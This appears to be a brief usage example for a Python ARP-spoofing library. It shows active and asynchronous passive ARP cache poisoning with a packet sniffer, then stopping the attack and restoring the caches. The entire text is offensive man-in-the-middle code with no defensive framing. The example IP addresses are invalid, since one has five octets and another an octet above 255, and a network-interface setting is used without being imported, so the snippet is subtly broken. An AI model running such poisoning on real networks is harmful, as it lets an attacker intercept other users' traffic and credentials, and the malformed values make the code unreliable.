from ArpSpoof import SpooferARP

spoofer = SpooferARP('172.16.10.100.1', '172.16.0.350')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('172.16.10.100.1', '172.16.0.350', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()                                   # only with asynchronous mode
spoofer.restore()                                        # only with asynchronous mode
